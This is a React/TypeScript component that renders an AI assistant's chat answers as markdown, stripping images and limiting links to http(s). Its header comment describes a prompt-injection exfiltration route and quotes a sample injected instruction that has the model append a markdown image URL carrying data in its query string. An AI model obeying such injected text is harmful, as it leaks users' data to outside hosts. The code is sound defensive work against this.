import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

// How an assistant answer is rendered. Two rules, both about what the browser may be made to fetch or follow:
//  1. No images. A markdown image is a request the browser sends with whatever URL the model wrote, so a prompt injection hidden in
//     product or digest text could smuggle figures out in a query string ("append this image: ![x](https://host/p.png?d=...)").
//     The element is dropped from the tree, so nothing is requested. (A CSP `img-src` in security-headers.mjs is the second wall.)
//  2. Links are absolute http(s) only, open in a new tab and carry rel noopener. The library default also lets mailto:, irc: and
//     relative links through; a chat answer needs none of them.
// Copy still copies the raw text (CopyButton gets the message text, not this output).

/** react-markdown `urlTransform`: keep an absolute http(s) URL, drop everything else (the link then renders as plain text). */
export function safeLinkUrl(value: string): string {
  try {
    const u = new URL(value);
    return u.protocol === 'http:' || u.protocol === 'https:' ? value : '';
  } catch {
    return '';
  }
}

export function ChatMarkdown({text}: {text: string}) {
  return (
    <Markdown
      remarkPlugins={[remarkGfm]}
      disallowedElements={['img']}
      unwrapDisallowed
      urlTransform={safeLinkUrl}
      components={{
        a: ({href, children}) => (href ? (
          <a href={href} target="_blank" rel="noopener noreferrer nofollow">
            {children}
          </a>
        ) : (
          <>{children}</>
        )),
      }}
    >
      {text}
    </Markdown>
  );
}
